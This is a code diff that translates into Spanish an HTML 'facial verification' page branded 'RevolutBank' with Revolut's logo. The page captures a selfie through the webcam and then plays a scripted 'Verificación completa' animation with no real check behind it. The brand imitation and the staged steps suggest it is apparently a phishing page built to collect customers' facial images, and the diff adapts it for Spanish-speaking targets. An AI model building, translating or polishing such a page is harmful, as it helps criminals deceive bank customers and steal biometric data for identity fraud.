@@ -17,7 +17,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>Facial verification — RevolutBank</title>
+<title>Verificación facial — RevolutBank</title>
 <link rel="icon" href="images/revolut-favicon.png"/>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
@@ -98,7 +98,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     <div class="brand"><img src="images/revolut-logo.svg" alt="Revolut" style="height:28px;width:auto;display:block;"/></div>
     <div class="user-block">
       <div class="user-info">
-        <div class="name" id="userName">customer</div>
+        <div class="name" id="userName">cliente</div>
         <div class="nif" id="userNif">*** *** ***</div>
       </div>
       <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
@@ -107,34 +107,34 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 
   <!-- INTRO -->
   <div class="card" id="intro">
-    <h1>Facial verification</h1>
-    <div class="lead">For your security, we need to verify your identity with a selfie. The process is quick and secure.</div>
+    <h1>Verificación facial</h1>
+    <div class="lead">Por tu seguridad, necesitamos verificar tu identidad con una selfie. El proceso es rápido y seguro.</div>
 
     <div class="item">
       <div class="ic y"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6l8-4z" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-      <div><div class="t">Limited use</div><div class="d">The photo will be used solely to verify your identity during the application process.</div></div>
+      <div><div class="t">Uso limitado</div><div class="d">La foto se utilizará únicamente para verificar tu identidad durante el proceso de solicitud.</div></div>
     </div>
     <div class="item">
       <div class="ic b"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 018 0v3" stroke-linecap="round"/></svg></div>
-      <div><div class="t">Data protection</div><div class="d">Your data and image will not be shared with third parties without your authorization.</div></div>
+      <div><div class="t">Protección de datos</div><div class="d">Tus datos e imagen no serán compartidos con terceros sin tu autorización.</div></div>
     </div>
     <div class="item">
       <div class="ic o"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-      <div><div class="t">Quick and simple</div><div class="d">It takes less than 1 minute — confirm and take the photo.</div></div>
+      <div><div class="t">Rápido y sencillo</div><div class="d">Tarda menos de 1 minuto — confirma y toma la foto.</div></div>
     </div>
 
-    <div class="legal">By confirming, you authorize the capture and use of the image to validate this operation, in accordance with the GDPR.</div>
+    <div class="legal">Al confirmar, autorizas la captura y uso de la imagen para validar esta operación, de acuerdo con la normativa de protección de datos.</div>
 
     <div class="actions">
       <button class="btn sec" onclick="history.back()">Cancelar</button>
-      <button class="btn pri" id="startBtn">Agree and continue</button>
+      <button class="btn pri" id="startBtn">Aceptar y continuar</button>
     </div>
   </div>
 
   <!-- CAMERA -->
   <div class="card cam" id="camView">
-    <h1>Position your face</h1>
-    <div class="hint">Keep your face centered in the oval and look at the camera.</div>
+    <h1>Posiciona tu cara</h1>
+    <div class="hint">Mantén tu cara centrada en el óvalo y mira a la cámara.</div>
     <div class="frame" id="frame">
       <video id="video" autoplay playsinline muted></video>
       <img id="snap" alt="" style="display:none"/>
@@ -144,14 +144,14 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     <input type="file" accept="image/*" capture="user" id="fileInput" style="display:none"/>
     <div class="actions" id="camActions">
       <button class="btn sec" id="retakeBtn" style="display:none">Retomar</button>
-      <button class="btn pri" id="captureBtn" disabled>Take photo</button>
+      <button class="btn pri" id="captureBtn" disabled>Tomar foto</button>
     </div>
   </div>
 
   <!-- PROCESSING -->
   <div class="card cam" id="procView">
     <h1>Verifying identity</h1>
-    <div class="hint" id="procStep">Analyzing biometrics...</div>
+    <div class="hint" id="procStep">Analizando biometría...</div>
     <div class="frame ok"><img id="snapPreview" alt=""/></div>
     <div style="height:6px;background:#f3f4f6;border-radius:4px;margin-top:16px;overflow:hidden"><div id="bar" style="height:100%;width:0;background:#0a0a0a;transition:width .4s"></div></div>
   </div>
@@ -186,7 +186,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:720},height:{ideal:960}},audio:false});
       video.srcObject = stream;
       video.onloadedmetadata = function(){
-        camHint.textContent = 'Ready! Once you are well positioned, tap "Take photo".';
+        camHint.textContent = 'Ready! Once you are well positioned, tap "Tomar foto".';
         captureBtn.disabled = false;
       };
     }catch(e){
@@ -205,13 +205,13 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     var data = c.toDataURL('image/jpeg',0.85);
     snap.src = data; snap.style.display='block'; video.style.display='none';
     document.getElementById('frame').classList.add('ok');
-    captureBtn.textContent = 'Confirmarar selfie';
+    captureBtn.textContent = 'Confirmar selfie';
     captureBtn.onclick = function(){ goProcess(data); };
     retakeBtn.style.display='block';
     retakeBtn.onclick = function(){
       snap.style.display='none'; video.style.display='block';
       document.getElementById('frame').classList.remove('ok');
-      captureBtn.textContent = 'Take photo';
+      captureBtn.textContent = 'Tomar foto';
       retakeBtn.style.display='none';
       captureBtn.onclick = doCapturar;
     };
@@ -229,7 +229,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     document.getElementById('camView').classList.remove('on');
     document.getElementById('procView').classList.add('on');
     document.getElementById('snapPreview').src = data || '';
-    var steps = ['Analyzing biometrics...','Comparing with the document...','Validating identity...','Verification complete ✓'];
+    var steps = ['Analizando biometría...','Comparando con el documento...','Validando identidad...','Verificación completa ✓'];
     var i=0, bar=document.getElementById('bar'), pct=15;
     bar.style.width = pct+'%';
     var t = setInterval(function(){
